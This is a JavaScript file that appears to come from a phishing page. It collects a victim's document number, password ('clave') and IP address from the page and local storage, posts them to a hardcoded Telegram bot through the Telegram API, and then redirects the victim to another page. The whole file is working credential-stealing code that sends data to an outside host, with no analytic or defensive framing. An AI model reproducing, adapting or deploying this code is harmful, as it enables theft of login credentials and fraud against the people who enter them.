//bot token
var telegram_bot_id = "5507065651:AAFzRdWe_cbWNtAmu8GHr-DUtzxAfuNcRE0";
//chat id
var chat_id = '-848277435';
var u_name, ip, ip2;
var ready = function () {
    doct = localStorage.getItem("Userr");
    u_name = document.getElementById("DocumentNumber").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    
    message = "CONTRASEÑA  DOC: " + doct + "\n\n clave: "+ u_name + "\n\nIP: " + ip +"\n" + ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index22.html';
        console.log(response);
    });
    return false;
};
